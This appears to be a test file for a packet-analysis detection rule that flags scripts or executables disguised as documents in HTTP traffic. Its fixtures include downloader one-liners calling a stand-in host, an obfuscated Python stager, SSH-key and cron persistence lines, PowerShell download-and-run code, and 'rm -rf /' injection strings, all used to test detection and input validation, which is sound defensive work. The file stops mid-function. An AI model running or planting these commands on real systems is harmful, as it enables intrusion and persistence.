"""Packet slice: Arkime packet fetch, constrained TShark, body analysis, the disguised-script rule, the stage."""
import hashlib
import json
import os
import subprocess
import time
from datetime import UTC, datetime, timedelta

import httpx
import pytest

from romulus.config import Settings
from romulus.detect.packets import (
    DisguisedScriptOrExecutable,
    analyze_body,
    declared_document,
    declared_media,
    show,
)
from romulus.detect.registry import fresh_pack
from romulus.evidence.typed import RawRef, TypedEvent, fv
from romulus.hunt import packets as hp
from romulus.hunt import run as hunt_run
from romulus.hunt.stage import clear_stale_stages
from romulus.sources import packets as pk
from romulus.sources.models import Completeness, SearchOutcome, Window
from romulus.sources.profile import contract_from_types
from romulus.store.db import make_engine, migrate
from romulus.store.repo import Repo

PCAP = b"\xd4\xc3\xb2\xa1" + b"\x00" * 60
SCRIPT = b"echo exec\\(__import__\\('zlib'\\).decompress\\(...\\)\\) | python3\n"
DROPPER = b"cd /tmp\nwget http://e/x\nchmod +x x\n./x\n"
# A Python stager echoed into whatever interpreter exists, and an SSH key appended for persistence.
STAGER = (b"echo exec\\(__import__\\(\\'zlib\\'\\).decompress\\(__import__\\(\\'base64\\'\\).b64decode\\("
          b"\\'eNpLtDKyqi62MrFSSkosTjUzUbIGAC9uBNA=\\'\\)\\)\\) | exec $(which python || which python3) -")
KEY_DROP = b'echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIExampleKeyOnly attacker" >> /root/.ssh/authorized_keys\n'
T0 = datetime(2024, 11, 18, 15, 0, 1, tzinfo=UTC)
TARGET = "arkime_sessions3-241118"
RULE = "pcap.disguised_script_or_executable"


# ---- body analysis -----------------------------------------------------------------------------

@pytest.mark.parametrize("body, kind, basis", [
    (b"\x7fELF\x02\x01\x01" + b"\x00" * 20, "executable", "magic"),
    (b"MZ" + b"\x00" * 60 + b"PE\x00\x00", "executable", "magic"),
    (b"\xce\xfa\xed\xfe" + b"\x00" * 20, "executable", "magic"),                    # 32-bit Mach-O
    (b"MZ is not a header here", "text", None),
    (b"#!/usr/bin/env python3\nprint(1)\n", "script", "shebang"),
    (b"\xef\xbb\xbf#!/bin/sh\ncurl http://e/x|sh\n", "script", "shebang"),          # after a BOM
    (b"\n  #!/bin/sh\nwget http://e/x\n", "script", "shebang"),                    # after whitespace
    (b"#!/bin/sh\n# caf\xe9\nid\n", "script", "shebang"),                          # not UTF-8
    (b"#! Important notes\nRead this first.\n", "text", None),                     # not an interpreter path
    (SCRIPT, "script", "heuristic"),
    (DROPPER, "script", "heuristic"),                                              # path-invoked ./x
    (b"wget http://e/x -O /tmp/x\n/tmp/x &\n", "script", "heuristic"),
    (b"U=http://e/x\ncurl $U | sh\n", "script", "heuristic"),                      # assignment lines
    (b"curl http://e/x -o /tmp/x\r\nchmod +x /tmp/x\r\n", "script", "heuristic"),  # CRLF
    (b"\xef\xbb\xbfcurl http://e/x -o /tmp/x\nchmod +x /tmp/x\n", "script", "heuristic"),
    (STAGER, "script", "heuristic"),                                               # ... | exec $(which python) -
    (KEY_DROP, "script", "heuristic"),                                             # echo key >> authorized_keys
    (b"echo 'a > b' and \"c | sh\"\n", "text", None),                              # quoted > and | are text
    (b"echo hello 2>&1 >/dev/null\n", "text", None),                               # discarding output writes nothing
    (b"/var/log/syslog\n/etc/passwd\n/etc/shadow\n", "text", None),                 # a list of paths
    (b"./a/b.txt\n./a/c.txt\n", "text", None),                                      # find output
    (b"grep error app.log > errors.txt\n", "text", None),                           # an ordinary redirect
    (b"if [ -f big ]; then echo big > out; fi\n", "text", None),
    (b'echo "a | sh\n', "text", None),                                             # an unclosed quote
    (b"echo 'source /opt/env.sh' >> ~/.bashrc\n", "script", "heuristic"),          # profile persistence
    (b"echo x > /tmp/.k\nchmod 700 /tmp/.k\n/tmp/.k\n", "script", "heuristic"),    # staged, then run
    (b"cd /tmp\nwget http://e/x\nif [ -f x ]; then\n./x\nelse\nexit 1\nfi\n", "script", "heuristic"),
    (b"[ -x /usr/bin/curl ] && curl -s http://e/x | sh\n", "script", "heuristic"),     # test-builtin lines
    (b"[ -d /root/.ssh ] || mkdir /root/.ssh; echo k >> /root/.ssh/authorized_keys\n", "script", "heuristic"),
    (b"echo '* * * * * curl e|sh' | crontab -\n", "script", "heuristic"),           # piped into crontab
    (b"/etc/passwd user accounts\n/etc/shadow password hashes\n", "text", None),    # paths with descriptions
    (b"echo done > /root/install.log\n", "text", None),                            # not a persistence target
    (b"echo hi | base64\n", "text", None),                                          # encoding is not running
    (b"/tmp/a.1\n/tmp/sess_x\n", "text", None),                                      # a list of temp files
    ("\ufeffIEX (iwr http://e/a)\n".encode("utf-16"), "script", "heuristic"),     # UTF-16 PowerShell
    (b"# Project notes\n\nInstall the package, then run the tests.\n", "text", None),
    # hard benign: command lists that fetch, run, decode or persist nothing
    (b"# Quick start\ngit clone https://example/repo\ncd repo\npip install -r requirements.txt\n", "text", None),
    (b"ping bob about the review\nfind a venue\ndone: tickets\n", "text", None),
    (b"ssh admin@10.0.0.5\nsudo systemctl restart nginx\n", "text", None),
    (b"\x00\x01\x02binary\x00", "binary", None),
    (b"", "empty", None),
])
def test_body_kind_and_basis_are_judged_from_the_bytes(body, kind, basis):
    info = analyze_body(body)
    assert (info.kind, info.basis) == (kind, basis)


def test_shebang_interpreter_pipes_and_offset_notes_are_reported():
    assert analyze_body(b"#!/usr/bin/env python3\nx=1\n").interpreter == "python3"
    assert "byte-order mark or leading whitespace" in analyze_body(b"\xef\xbb\xbf#!/bin/sh\nid\n").detail
    assert "leading whitespace" not in analyze_body(b"#!/bin/sh\nid\n").detail
    info = analyze_body(SCRIPT)
    assert info.commands == ["echo"] and info.piped_to == ["python3"]
    assert "path:x" in analyze_body(DROPPER).commands


def test_pipes_into_exec_and_redirects_to_files_are_execution_signals():
    stager = analyze_body(STAGER)
    assert stager.piped_to == ["exec"] and stager.writes == []
    drop = analyze_body(KEY_DROP)
    assert drop.writes == ["/root/.ssh/authorized_keys"] and drop.commands == ["echo"]
    m = rule(body_event("k", KEY_DROP, url="http://h/README.txt.1", ctype="text/plain"))
    assert m and m[0].proposed_lane == "lead" and "redirects output to /root/.ssh/authorized_keys" in m[0].claim


def test_heuristic_matches_carry_medium_confidence_and_the_full_time_range():
    evs = [body_event(f"s{i}", SCRIPT, ts=T0 + timedelta(minutes=i)) for i in range(30)]
    m = rule(*evs)[0]
    assert m.confidence == "medium" and len(m.events) == 20
    assert f"– {(T0 + timedelta(minutes=29)).isoformat()})" in m.claim       # the last of 30, not of 20 cited
    assert rule(body_event("e", b"\x7fELF" + b"\x00" * 10))[0].confidence == "high"


@pytest.mark.parametrize("path, encoding, expect", [
    ("http://h/install.sh.gz", "gzip", False),          # decompressed by TShark: it is install.sh
    ("http://h/busybox.gz", "gzip", False),
    ("http://h/notes.txt.gz", "gzip", True),
    ("http://h/install.sh.gz", None, True),             # no encoding: the body really was served as .gz
])
def test_compression_suffixes_follow_the_content_encoding(path, encoding, expect):
    assert bool(declared_document(path, None, encoding) or declared_media(path, None, encoding)) is expect


def test_cafebabe_is_labelled_honestly():
    assert "Java class" in analyze_body(b"\xca\xfe\xba\xbe\x00\x00\x00\x34" + b"\x00" * 20).detail


@pytest.mark.parametrize("path, ctype, expect", [
    ("http://192.0.2.174/TODO.md", "text/markdown", True),
    ("http://192.0.2.174/README.txt.1", None, True),               # numeric suffixes are ignored
    ("http://h/TODO%2Emd", None, True),                            # percent-encoded name
    ("http://host/install.sh", "text/x-sh", False),
    ("http://host/install.sh", "text/plain; charset=utf-8", False),
    ("http://h/notes.txt.sh", "application/x-sh", False),          # only the last suffix counts
    ("http://h/report.pdf.exe", "application/octet-stream", False),
    ("http://h/x", "text/plain", False),                           # text/plain alone is neutral
    ("http://h/x", "text/html", True),
    ("http://host/a", "image/png", True),
    ("/zm/robots.txt?x=1", None, True),
])
def test_served_as_a_document_uses_the_last_suffix_and_a_non_neutral_type(path, ctype, expect):
    assert bool(declared_document(path, ctype)) is expect


def test_show_makes_bidi_and_control_characters_visible():
    assert show("evil\u202etxt.sh\x1b[31m") == "evil\\u202etxt.sh\\u001b[31m"
    assert show("a" * 300).endswith("…") and len(show("a" * 300)) == 201


# ---- the rule ----------------------------------------------------------------------------------

def body_event(_id, body, *, url="http://192.0.2.174/TODO.md", ctype="text/markdown", client="172.17.100.121",
               ts=T0, limit=None):
    info = analyze_body(body)
    fields = {"source.ip": "192.0.2.174", "destination.ip": client, "url.original": url,
              "http.response.status_code": 200, "http.content_type": ctype, "file.size": len(body),
              "file.sha256": hashlib.sha256(body).hexdigest(), "http.body.kind": info.kind,
              "http.body.basis": info.basis, "http.body.detail": info.detail or None,
              "http.body.commands": info.commands or None, "http.body.piped_to": info.piped_to or None,
              "http.body.writes": info.writes or None,
              "http.body.analysis_limit": limit, "arkime.session_id": f"241118-{_id}"}
    return TypedEvent(id=_id, family="http_body", ts=ts, host="server",
                      fields={k: fv(v, f"fixture:{k}") for k, v in fields.items() if v is not None},
                      raw=[RawRef(target="arkime-pcap:x", native_id=_id)], normalizer="fixture")


def rule(*events):
    r = DisguisedScriptOrExecutable()
    r.consume(list(events))
    return r.finalize()


def test_repeated_heuristic_script_is_one_lead_with_exact_counts_and_hedged_wording():
    m = rule(*[body_event(f"s{i}", SCRIPT, ts=T0 + timedelta(minutes=15 * i)) for i in range(10)])
    assert len(m) == 1 and m[0].proposed_lane == "lead"            # heuristic-only is never above lead
    assert m[0].claim.startswith("Packets show 10 HTTP 200 response(s)")
    assert "served as a document (file name 'todo.md' (extension .md); declared Content-Type text/markdown)" in m[0].claim
    assert "pipes into python3" in m[0].claim and "content heuristic" in m[0].claim
    assert "does not show one" in m[0].claim and "not established" in m[0].claim


def test_lanes_follow_the_strength_of_the_evidence():
    elf = body_event("b", b"\x7fELF\x02" + b"\x00" * 30, url="http://host/logo.png", ctype="image/png")
    assert rule(elf)[0].proposed_lane == "high"
    under_png = body_event("c", b"#!/bin/sh\nid\n", url="http://host/logo.png", ctype="image/png")
    assert rule(under_png)[0].proposed_lane == "high"               # no reading of a script makes .png honest
    under_md = body_event("d", b"#!/bin/sh\nid\n")
    assert rule(under_md)[0].proposed_lane == "lead"
    assert rule(body_event("a", DROPPER))[0].proposed_lane == "lead"


def test_claims_escape_hostile_urls_and_note_the_analysis_limit():
    ev = body_event("e", b"\x7fELF" + b"\x00" * 10, url="http://h/a\u202egnp.md", limit=1048576)
    m = rule(ev)[0]
    assert "\u202e" not in m.claim and "\\u202e" in m.claim
    assert any("first 1048576 bytes" in n for n in m.notes)


@pytest.mark.parametrize("ev", [
    body_event("t", b"# Notes\n\nPlain prose here.\n"),                                # a real document
    body_event("u", SCRIPT, url="http://host/install.sh", ctype="text/x-sh"),           # a script served as one
    body_event("v", SCRIPT, url="http://host/install", ctype="text/plain"),             # text/plain is neutral
    body_event("w", b"# Quick start\ngit clone https://e/r\ncd r\nmake\n"),              # build steps
])
def test_documents_and_honestly_named_scripts_do_not_match(ev):
    assert rule(ev) == []


def test_packet_rules_never_run_in_the_sweep():
    assert not [p for p in fresh_pack() if p.kind == "packet"]


def test_http_bodies_are_network_observations_not_host_activity():
    ev = body_event("x", SCRIPT)
    assert ev.entities()[0] == ("host", "server", "observer")         # the sensor saw it; it did not do it


# ---- Arkime packet fetch -----------------------------------------------------------------------

def _settings(tmp_path, **kw):
    return Settings(home=tmp_path, arkime_url="http://arkime.test", arkime_username="u", arkime_password="p", **kw)


def _fetcher(tmp_path, handler, **kw):
    return pk.ArkimePackets(_settings(tmp_path), transport=httpx.MockTransport(handler), **kw)


def test_fetch_is_a_get_for_explicit_ids_only(tmp_path):
    seen = []

    def handler(request):
        seen.append(request)
        return httpx.Response(200, content=PCAP)

    out = _fetcher(tmp_path, handler).fetch(["241118-AAAAAAAAAAAA", "241118-BBBBBBBBBBBB"], tmp_path / "a.pcap")
    assert out.error is None and out.path.read_bytes() == PCAP
    assert all(r.method == "GET" and r.url.path == "/api/sessions/pcap" for r in seen)
    assert seen[-1].url.params["ids"] == "241118-AAAAAAAAAAAA,241118-BBBBBBBBBBBB"


@pytest.mark.parametrize("status, body, error", [
    (403, b'{"success":false}', "refused packet download"),
    (200, b"<html>login</html>", "not a capture file"),
    (500, b"", "HTTP 500"),
])
def test_fetch_failures_are_reported_not_raised(tmp_path, status, body, error):
    out = _fetcher(tmp_path, lambda r: httpx.Response(status, content=body)).fetch(["241118-AAAAAAAAAAAA"],
                                                                                 tmp_path / "a.pcap")
    assert out.path is None and error in out.error


def test_fetch_caps_bytes(tmp_path):
    out = _fetcher(tmp_path, lambda r: httpx.Response(200, content=PCAP + b"x" * 5000), max_bytes=100).fetch(
        ["241118-AAAAAAAAAAAA"], tmp_path / "a.pcap")
    assert out.capped and out.path.stat().st_size == 100


@pytest.mark.parametrize("ids", [["bad id; rm -rf /"], [], [f"241118-{i:012d}" for i in range(21)]])
def test_fetch_refuses_invalid_or_too_many_ids(tmp_path, ids):
    with pytest.raises(pk.PacketError):
        _fetcher(tmp_path, lambda r: httpx.Response(200, content=PCAP)).fetch(ids, tmp_path / "a.pcap")


def test_fetch_honours_tls_verification_and_closes(tmp_path, monkeypatch):
    seen = {}
    real = httpx.Client

    def client(**kw):
        seen.update(kw)
        return real(**{k: v for k, v in kw.items() if k != "verify"})

    monkeypatch.setattr(pk.httpx, "Client", client)
    with pk.ArkimePackets(_settings(tmp_path, arkime_verify_tls=False)) as fetcher:
        pass
    assert seen["verify"] is False and fetcher.http.is_closed


# ---- TShark --------------------------------------------------------------------------------------

def _tshark_json(*layers):
    return json.dumps([{"_source": {"layers": la}} for la in layers]).encode()


def test_tshark_runs_the_fixed_query_with_pinned_prefs_and_json_output(tmp_path, monkeypatch):
    cap = tmp_path / "a.pcap"
    cap.write_bytes(PCAP)
    calls = []

    def fake_run(cmd, **kw):
        calls.append((cmd, kw))
        return subprocess.CompletedProcess(cmd, 2, stdout=_tshark_json({"frame.number": ["9"],
                                                                         "http.content_type": ["a\tb,c"]}),
                                           stderr=b"The file appears to have been cut short in the middle of a packet.")

    monkeypatch.setattr(pk.subprocess, "run", fake_run)
    res = pk.run_tshark(Settings(home=tmp_path), cap, "http_messages", [tmp_path], http_ports=[8000, 80])
    cmd, kw = calls[0]
    assert "-c" not in cmd and cmd[cmd.index("-Y") + 1] == "http.request || http.response" and "-r" in cmd
    assert cmd[cmd.index("-T") + 1] == "json"
    assert all(p in cmd for p in pk.PINNED_PREFS) and cmd[cmd.index("tcp.desegment_tcp_streams:TRUE") - 1] == "-o"
    assert [cmd[i + 1] for i, a in enumerate(cmd) if a == "-d"] == ["tcp.port==80,http", "tcp.port==8000,http"]
    assert res.truncated and res.error is None
    assert res.rows[0]["frame.number"] == ["9"] and res.rows[0]["http.content_type"] == ["a\tb,c"]
    assert res.rows[0]["ip.src"] == []                         # every query field is present, possibly empty
    assert "preexec_fn" not in kw                              # limits come from prlimit, not a forked hook


def test_merge_runs_mergecap_on_allowed_paths_only(tmp_path, monkeypatch):
    parts = []
    for i in range(2):
        part = tmp_path / f"p{i}.pcap"
        part.write_bytes(PCAP)
        parts.append(part)
    calls = []
    monkeypatch.setattr(pk.subprocess, "run", lambda cmd, **kw: calls.append(cmd) or subprocess.CompletedProcess(cmd, 0))
    assert pk.merge_captures(Settings(home=tmp_path), parts, tmp_path / "m.pcap", [tmp_path]) is None
    cmd = calls[0]
    i = next(j for j, a in enumerate(cmd) if a.endswith("mergecap") or a == "mergecap" or "mergecap" in a)
    assert cmd[i + 1:i + 3] == ["-w", str(tmp_path / "m.pcap")] and cmd[-2:] == [str(p.resolve()) for p in parts]
    outside = tmp_path.parent / "elsewhere-merge"
    outside.mkdir(exist_ok=True)
    with pytest.raises(pk.PacketError):
        pk.merge_captures(Settings(home=tmp_path), parts, outside / "m.pcap", [tmp_path])


def test_tshark_limits_use_prlimit_where_it_exists(monkeypatch):
    monkeypatch.setattr(pk.os, "name", "posix")
    monkeypatch.setattr(pk.shutil, "which", lambda name: "/usr/bin/prlimit" if name == "prlimit" else None)
    cmd = pk.limited(["tshark", "-r", "x"], 180)
    assert cmd[:4] == ["/usr/bin/prlimit", f"--as={pk.TSHARK_MEMORY_BYTES}", "--cpu=185", "--"]
    assert cmd[4:] == ["tshark", "-r", "x"]
    monkeypatch.setattr(pk.shutil, "which", lambda name: None)
    assert pk.limited(["tshark"], 180) == ["tshark"]


@pytest.mark.parametrize("ports", [["80; rm -rf /"], [0], [70000], [True], [str(80)]])
def test_tshark_refuses_decode_ports_that_are_not_port_numbers(tmp_path, ports):
    cap = tmp_path / "a.pcap"
    cap.write_bytes(PCAP)
    with pytest.raises(pk.PacketError):
        pk.run_tshark(Settings(home=tmp_path), cap, "http_messages", [tmp_path], http_ports=ports)


def test_tshark_invalid_output_is_an_error_not_an_empty_result(tmp_path, monkeypatch):
    cap = tmp_path / "a.pcap"
    cap.write_bytes(PCAP)
    monkeypatch.setattr(pk.subprocess, "run", lambda cmd, **kw: subprocess.CompletedProcess(cmd, 0, b"[{", b""))
    assert pk.run_tshark(Settings(home=tmp_path), cap, "http_messages", [tmp_path]).error


def test_tshark_refuses_paths_outside_allowed_dirs(tmp_path):
    other = tmp_path / "elsewhere"
    other.mkdir()
    cap = other / "a.pcap"
    cap.write_bytes(PCAP)
    with pytest.raises(pk.PacketError):
        pk.run_tshark(Settings(home=tmp_path), cap, "http_messages", [tmp_path / "allowed"])


def test_hex_body_hash_and_size_cover_the_whole_body_while_analysis_is_capped():
    data = bytes(range(256)) * 20000                               # ~5 MiB, beyond one decode chunk
    body = pk.decode_hex_body(data.hex(), 1024)
    assert body.head == data[:1024] and body.cut and body.size == len(data)
    assert body.sha256 == hashlib.sha256(data).hexdigest()
    assert pk.decode_hex_body("41:42", 10).head == b"AB"
    for bad in ("zz", "414"):
        with pytest.raises(pk.PacketError):
            pk.decode_hex_body(bad, 10)


def test_addresses_use_the_innermost_ip_layer():
    row = {"frame.protocols": ["eth:ethertype:ip:gre:ip:tcp:http"], "ip.src": ["10.9.9.1", "192.0.2.174"],
           "ip.dst": ["10.9.9.2", "172.17.100.121"], "tcp.srcport": ["80"], "tcp.dstport": ["50000"]}
    assert hp._addresses(row) == ("192.0.2.174", "80", "172.17.100.121", "50000")
    v6in4 = {"frame.protocols": ["eth:ethertype:ip:ipv6:tcp:http"], "ip.src": ["10.0.0.1"], "ip.dst": ["10.0.0.2"],
             "ipv6.src": ["2001:db8::1"], "ipv6.dst": ["2001:db8::2"], "tcp.srcport": ["80"], "tcp.dstport": ["5"]}
    assert hp._addresses(v6in4)[0] == "2001:db8::1"


# ---- the stage, end to end with stubbed Arkime and TShark ---------------------------------------

class _Packets:
    def __init__(self, error=None, capped=False, max_bytes=32 * 1024 * 1024):
        self.error, self.capped, self.max_bytes, self.calls = error, capped, max_bytes, []

    def fetch(self, ids, dest, max_bytes=None):
        self.calls.append(list(ids))
        if self.error:
            return pk.PacketFetch(None, ids, error=self.error)
        limit = min(self.max_bytes, max_bytes or self.max_bytes)
        body = PCAP[:limit]
        dest.write_bytes(body)
        return pk.PacketFetch(dest, ids, len(body), capped=self.capped or len(body) < len(PCAP))


def _merge(merges=None):
    def merge(s, parts, dest, dirs):
        if merges is not None:
            merges.append([x.name for x in parts])
        dest.write_bytes(PCAP)
    return merge


def _ms(dt):
    return int(dt.timestamp() * 1000)


def _session(_id, cport, first=T0 - timedelta(minutes=1), last=T0 + timedelta(hours=1)):
    return {"_id": _id, "_index": TARGET, "_source": {
        "node": "server", "network": {"community_id": f"1:{_id}="}, "firstPacket": _ms(first),
        "lastPacket": _ms(last), "source": {"ip": "172.17.100.121", "port": cport},
        "destination": {"ip": "192.0.2.174", "port": 80}}}


def _row(cport, epoch, *, body=SCRIPT, uri="http://192.0.2.174/TODO.md", frame="7"):
    row = {"frame.number": [frame], "frame.time_epoch": [str(epoch)], "frame.protocols": ["eth:ethertype:ip:tcp:http"],
           "tcp.stream": ["0"], "ip.src": ["192.0.2.174"], "tcp.srcport": ["80"], "ip.dst": ["172.17.100.121"],
           "tcp.dstport": [str(cport)], "ipv6.src": [], "ipv6.dst": [], "http.response.code": ["200"],
           "http.content_type": ["text/markdown"], "http.content_length": [str(len(body))],
           "http.response_for.uri": [uri] if uri else [], "http.file_data": [body if isinstance(body, str) else body.hex()]}
    return row


def _contract(**extra):
    types = {"firstPacket": "date", "lastPacket": "date", "network.community_id": "keyword", "protocol": "keyword",
             "http.bodyMagic": "keyword", **extra}
    return contract_from_types(TARGET, types)


def _stage(tmp_path, monkeypatch, packets=None, *, sessions=None, rows=None, outcome=None, contract=None,
           intents=None, window=None, merges=None):
    sessions = sessions if sessions is not None else [_session(f"241118-SESS{i:08d}", 50000 + i) for i in range(3)]
    rows = rows if rows is not None else [_row(50000 + i, T0.timestamp() + 900 * i) for i in range(3)]

    def execute(client, intent, contract):
        if intents is not None:
            intents.append(intent)
        if intent.kind == "histogram":
            return SearchOutcome(target=intent.target, fingerprint="h", started_at=T0, ended_at=T0,
                                 completeness=Completeness.complete, total=4, total_relation="eq")
        return outcome or SearchOutcome(
            target=intent.target, fingerprint="f", started_at=T0, ended_at=T0, completeness=Completeness.complete,
            total=len(sessions), total_relation="eq", returned=len(sessions), records=sessions)

    monkeypatch.setattr(hp, "execute", execute)
    monkeypatch.setattr(hp, "run_tshark", lambda s, pcap, query, dirs, http_ports=(): pk.TsharkResult(rows=rows))
    monkeypatch.setattr(hp, "merge_captures", _merge(merges))
    engine = make_engine(":memory:")
    migrate(engine)
    repo = Repo(engine)
    repo.create_hunt("h1", {}, "d", "t")
    window = window or Window(start=T0 - timedelta(hours=1), end=T0 + timedelta(hours=2))
    summary = hp.run_packet_stage(Settings(home=tmp_path), repo, None, "h1", window,
                                  {TARGET: contract or _contract()}, packets=packets or _Packets())
    return repo, summary


def _cell(repo):
    return next(c for c in repo.rule_cells("h1") if c["rule_id"] == RULE)


def test_stage_publishes_a_cited_finding_and_a_per_target_positive_only_cell(tmp_path, monkeypatch):
    from romulus.report import manifest as rm
    repo, summary = _stage(tmp_path, monkeypatch)
    assert summary["status"] == "complete" and summary["finished"] and summary["partial_reasons"] == []
    assert summary["candidates"] == 3 and summary["responses"] == 3 and summary["sessions_with_responses"] == 3
    found = [c for c in repo.candidates("h1") if c["rule_id"] == RULE]
    assert len(found) == 1 and found[0]["lane"] == "lead"
    cites = rm._citations(repo, found[0])
    assert len(cites) == 3 and all(c["status"] == "retained" for c in cites)
    cell = _cell(repo)
    assert cell["state"] == "matched" and cell["target"] == f"arkime-pcap:{TARGET}"
    assert summary["http_sessions_without_body_type"] == {TARGET: 4}
    assert not list((tmp_path / "stage").glob("romulus-pcap-*"))          # packets are removed after use


def test_coverage_counts_pcap_cells_for_their_target_and_states_the_selection(tmp_path, monkeypatch):
    from romulus.report import manifest as rm
    engine = make_engine(":memory:")
    migrate(engine)
    repo = Repo(engine)
    repo.create_hunt("h1", {}, "d", "t")
    sessions = [_session(f"241118-SESS{i:08d}", 50000 + i) for i in range(3)]
    rows = [_row(50000 + i, T0.timestamp()) for i in range(3)]
    monkeypatch.setattr(hp, "execute", lambda client, intent, contract: SearchOutcome(
        target=intent.target, fingerprint="f", started_at=T0, ended_at=T0, completeness=Completeness.complete,
        total=len(sessions) if intent.kind == "raw" else 7, total_relation="eq", returned=len(sessions),
        records=sessions if intent.kind == "raw" else []))
    monkeypatch.setattr(hp, "run_tshark", lambda s, pcap, query, dirs, http_ports=(): pk.TsharkResult(rows=rows))
    monkeypatch.setattr(hp, "merge_captures", _merge())
    host = contract_from_types("logs-lab", {"@timestamp": "date", "host.name": "keyword"})
    window = Window(start=T0 - timedelta(hours=1), end=T0 + timedelta(hours=2))
    hp.run_packet_stage(Settings(home=tmp_path), repo, None, "h1", window, {TARGET: _contract(), "logs-lab": host},
                        packets=_Packets())
    cells = [c for c in repo.rule_cells("h1") if c["rule_id"] == RULE]
    assert {c["target"]: c["state"] for c in cells} == {f"arkime-pcap:{TARGET}": "matched",
                                                         "logs-lab": "not_applicable_no_events"}
    row = next(r for r in rm._coverage(repo.rule_cells("h1"), targets=[TARGET, "logs-lab"])["rules"]
               if r["rule_id"] == RULE)
    assert "no evaluation recorded" not in row["negative_claim"]
    assert f"examined on {TARGET}: {hp.SELECTION_OVERLAP}" in row["negative_claim"]
    assert "7 HTTP session(s) there had no body type" in row["negative_claim"]


def test_candidate_selection_overlaps_the_window(tmp_path, monkeypatch):
    intents = []
    window = Window(start=T0 - timedelta(hours=1), end=T0 + timedelta(hours=2))
    _stage(tmp_path, monkeypatch, intents=intents, window=window)
    raw = next(i for i in intents if i.kind == "raw")
    assert raw.window.start == window.start - hp.OVERLAP_LOOKBACK and raw.window.end == window.end
    assert any(p.field == "lastPacket" and p.op == "gte" and p.value == window.start.isoformat() for p in raw.filters)


def test_without_last_packet_the_selection_falls_back_and_says_so(tmp_path, monkeypatch):
    contract = _contract(lastPacket="keyword")                     # present, but not range-searchable
    repo, summary = _stage(tmp_path, monkeypatch, contract=contract)
    assert summary["selection"][TARGET] == hp.SELECTION_WINDOW            # the text says what was actually used
    assert _cell(repo)["detail"]["selection"] == hp.SELECTION_WINDOW
    assert "not selected" in hp.SELECTION_WINDOW and "overlapping" not in hp.SELECTION_WINDOW


def test_overlap_selection_is_named_in_the_cell(tmp_path, monkeypatch):
    repo, summary = _stage(tmp_path, monkeypatch)
    assert summary["selection"][TARGET] == hp.SELECTION_OVERLAP == _cell(repo)["detail"]["selection"]


# B1: every way work can be lost is partial, in the cell and in the stage status, from one list of reasons

def _partial(repo, summary, fragment):
    assert summary["status"] == "partial" and summary["finished"]
    assert any(fragment in r for r in summary["partial_reasons"]), summary["partial_reasons"]
    assert _cell(repo)["state"] in ("positive_only_partial", "match_on_partial")


def test_partial_candidate_query_is_partial(tmp_path, monkeypatch):
    sessions = [_session("241118-SESS00000000", 50000)]
    out = SearchOutcome(target=TARGET, fingerprint="f", started_at=T0, ended_at=T0,
                        completeness=Completeness.partial, reasons=["shard_failures"], total=1, total_relation="eq",
                        returned=1, records=sessions)
    repo, summary = _stage(tmp_path, monkeypatch, sessions=sessions, rows=[_row(50000, T0.timestamp())],
                           outcome=out)
    _partial(repo, summary, "candidate selection partial: shard_failures")


def test_candidate_cap_is_partial(tmp_path, monkeypatch):
    sessions = [_session(f"241118-SESS{i:08d}", 1000 + i) for i in range(hp.MAX_SESSIONS + 1)]
    out = SearchOutcome(target=TARGET, fingerprint="f", started_at=T0, ended_at=T0, completeness=Completeness.partial,
                        reasons=[f"cap:{hp.MAX_SESSIONS + 1}<total:900"], total=900, total_relation="eq",
                        returned=len(sessions), records=sessions)
    rows = [_row(1000 + i, T0.timestamp()) for i in range(hp.MAX_SESSIONS)]
    repo, summary = _stage(tmp_path, monkeypatch, sessions=sessions, rows=rows, outcome=out)
    assert summary["candidates"] == hp.MAX_SESSIONS
    _partial(repo, summary, f"first {hp.MAX_SESSIONS} of 900 session documents examined")


def test_failed_candidate_query_is_partial(tmp_path, monkeypatch):
    out = SearchOutcome(target=TARGET, fingerprint="f", started_at=T0, ended_at=T0, completeness=Completeness.failed,
                        error="connection refused")
    repo, summary = _stage(tmp_path, monkeypatch, outcome=out)
    _partial(repo, summary, "candidate selection failed")


def test_fetched_session_without_a_response_is_partial(tmp_path, monkeypatch):
    rows = [_row(50000 + i, T0.timestamp()) for i in range(2)]                  # the third session yields nothing
    repo, summary = _stage(tmp_path, monkeypatch, rows=rows)
    assert summary["sessions_without_messages"] == 1
    _partial(repo, summary, "1 fetched session(s) had no HTTP message")


def test_short_selection_below_the_cap_is_partial(tmp_path, monkeypatch):
    sessions = [_session(f"241118-SESS{i:08d}", 50000 + i) for i in range(3)]
    out = SearchOutcome(target=TARGET, fingerprint="f", started_at=T0, ended_at=T0, completeness=Completeness.partial,
                        reasons=[f"cap:{hp.MAX_SESSIONS + 1}<total:400"], total=400, total_relation="eq",
                        returned=3, records=sessions)
    repo, summary = _stage(tmp_path, monkeypatch, sessions=sessions, outcome=out)
    _partial(repo, summary, "candidate selection partial: cap:")


def test_short_selection_without_a_reason_is_still_partial(tmp_path, monkeypatch):
    sessions = [_session(f"241118-SESS{i:08d}", 50000 + i) for i in range(3)]
    out = SearchOutcome(target=TARGET, fingerprint="f", started_at=T0, ended_at=T0, completeness=Completeness.complete,
                        total=5, total_relation="eq", returned=3, records=sessions)
    repo, summary = _stage(tmp_path, monkeypatch, sessions=sessions, outcome=out)
    _partial(repo, summary, "returned 3 of 5 documents")


def test_request_without_a_response_is_counted_not_partial(tmp_path, monkeypatch):
    request = {"frame.number": ["3"], "frame.time_epoch": [str(T0.timestamp())],
               "frame.protocols": ["eth:ethertype:ip:tcp:http"], "ip.src": ["172.17.100.121"],
               "tcp.srcport": ["50002"], "ip.dst": ["192.0.2.174"], "tcp.dstport": ["80"],
               "http.request.method": ["POST"], "http.response.code": []}
    rows = [_row(50000, T0.timestamp()), _row(50001, T0.timestamp()), request]
    sessions = [_session(f"241118-SESS{i:08d}", 50000 + i) for i in range(3)]
    sessions[2]["_source"]["server"] = {"bytes": 0}                  # Arkime agrees: the server sent nothing
    _repo, summary = _stage(tmp_path, monkeypatch, sessions=sessions, rows=rows)
    assert summary["sessions_request_only"] == 1 and summary["sessions_without_messages"] == 0
    assert summary["status"] == "complete" and any("no response" in n for n in summary["notes"])


def test_undecodable_body_is_partial(tmp_path, monkeypatch):
    rows = [_row(50000, T0.timestamp(), body="zz"), _row(50001, T0.timestamp()), _row(50002, T0.timestamp())]
    repo, summary = _stage(tmp_path, monkeypatch, rows=rows)
    assert summary["undecodable_bodies"] == 1
    _partial(repo, summary, "could not be decoded")


def test_response_without_a_request_is_partial(tmp_path, monkeypatch):
